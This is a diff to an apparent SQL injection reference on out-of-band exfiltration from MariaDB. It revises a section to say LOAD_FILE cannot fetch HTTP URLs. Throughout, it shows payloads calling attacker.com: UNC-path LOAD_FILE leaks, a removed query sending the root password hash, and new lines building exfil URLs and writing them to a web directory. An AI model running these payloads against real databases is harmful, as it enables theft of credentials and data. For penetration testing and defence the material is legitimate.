@@ -77,30 +77,29 @@ SELECT LOAD_FILE('\\\\attacker.com\\share\\file')
 SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\', DATABASE(), '\\file'))
 ```
 
-#### 3. HTTP Requests (via LOAD_FILE)
+#### 3. Note on HTTP Exfiltration
 
-MariaDB can attempt to fetch URLs, which can be used for data exfiltration:
+`LOAD_FILE()` **cannot** fetch HTTP URLs - it only reads local filesystem paths (and UNC paths on Windows for SMB/DNS exfiltration). This is a common misconception.
+
+For HTTP-based out-of-band exfiltration, other mechanisms are required:
+
+- External UDFs (User Defined Functions) with network capabilities
+- Server-side command execution via `sys_exec()` (if installed)
+- DNS exfiltration (covered above) - the most reliable OOB method for MariaDB
+- Writing data to web-accessible directories (covered below)
+
+The URL construction examples below are useful for building URLs that could be fetched by external tools or written to files for retrieval, but MariaDB itself cannot make HTTP requests via `LOAD_FILE()`.
 
 ```sql
-SELECT LOAD_FILE(CONCAT('http://attacker.com/', (SELECT password FROM mysql.user WHERE user='root')));
-```
-
-##### HTTP URL Construction Examples
-
-```sql
--- Basic HTTP URL with database name
-SELECT CONCAT('http://attacker.com/', DATABASE()) AS http_url
-
--- With hex-encoded data
+-- Construct a URL for external use (not for LOAD_FILE)
 SELECT CONCAT('http://attacker.com/exfil?data=', HEX(USER())) AS http_url
 
--- With multiple parameters
+-- This URL could be written to a file and retrieved later
 SELECT CONCAT(
   'http://attacker.com/exfil',
   '?db=', DATABASE(),
-  '&user=', SUBSTRING_INDEX(USER(), '@', 1),
-  '&ver=', REPLACE(VERSION(), '.', '_')
-) AS http_url
+  '&user=', SUBSTRING_INDEX(USER(), '@', 1)
+) INTO OUTFILE '/var/www/html/exfil_url.txt';
 ```
 
 #### 4. File-based Exfiltration
